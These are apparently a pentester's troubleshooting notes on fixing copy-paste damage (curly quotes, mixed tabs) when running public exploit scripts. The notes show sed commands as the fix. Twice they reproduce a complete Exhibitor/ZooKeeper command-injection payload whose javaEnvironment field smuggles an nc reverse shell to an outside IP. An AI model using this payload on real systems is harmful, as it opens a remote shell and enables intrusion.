

copy and paste problems


example: for exploit 
https://www.exploit-db.com/exploits/48654

the " in json parameters got converted to curly “ after copy and paste



cat data.json                                                           
{ “zookeeperInstallDirectory”: “/opt/zookeeper”, “zookeeperDataDirectory”: “/opt/zookeeper/snapshots”, “zookeeperLogDirectory”: “/opt/zookeeper/transactions”, “logIndexDirectory”: “/opt/zookeeper/transactions”, “autoManageInstancesSettlingPeriodMs”: “0”, “autoManageInstancesFixedEnsembleSize”: “0”, “autoManageInstancesApplyAllAtOnce”: “1”, “observerThreshold”: “0”, “serversSpec”: “1:exhibitor-demo”, “javaEnvironment”: “$(/bin/nc -e /bin/sh 192.168.45.229 4444 &)”, “log4jProperties”: “”, “clientPort”: “2181”, “connectPort”: “2888”, “electionPort”: “3888”, “checkMs”: “30000”, “cleanupPeriodMs”: “300000”, “cleanupMaxFiles”: “20”, “backupPeriodMs”: “600000”, “backupMaxStoreMs”: “21600000”, “autoManageInstances”: “1”, “zooCfgExtra”: { “tickTime”: “2000”, “initLimit”: “10”, “syncLimit”: “5”, “quorumListenOnAllIPs”: “true” }, “backupExtra”: { “directory”: “” }, “serverId”: 1 }

run this command to fix
# sed -i 's/[“”]/"/g' data.json

cat data.json                
{ "zookeeperInstallDirectory": "/opt/zookeeper", "zookeeperDataDirectory": "/opt/zookeeper/snapshots", "zookeeperLogDirectory": "/opt/zookeeper/transactions", "logIndexDirectory": "/opt/zookeeper/transactions", "autoManageInstancesSettlingPeriodMs": "0", "autoManageInstancesFixedEnsembleSize": "0", "autoManageInstancesApplyAllAtOnce": "1", "observerThreshold": "0", "serversSpec": "1:exhibitor-demo", "javaEnvironment": "$(/bin/nc -e /bin/sh 192.168.45.229 4444 &)", "log4jProperties": "", "clientPort": "2181", "connectPort": "2888", "electionPort": "3888", "checkMs": "30000", "cleanupPeriodMs": "300000", "cleanupMaxFiles": "20", "backupPeriodMs": "600000", "backupMaxStoreMs": "21600000", "autoManageInstances": "1", "zooCfgExtra": { "tickTime": "2000", "initLimit": "10", "syncLimit": "5", "quorumListenOnAllIPs": "true" }, "backupExtra": { "directory": "" }, "serverId": 1 }

------

TabError: inconsistent use of tabs and spaces in indentation

use the `sed` command to force the entire file to use spaces. This is much faster than fixing it manually in a text editor.

Run this command in your terminal:

Bash

```
sed -i 's/\t/    /g' 52038.py
```

**What this does:** It searches for every **Tab** character (`\t`) and replaces it with **4 spaces**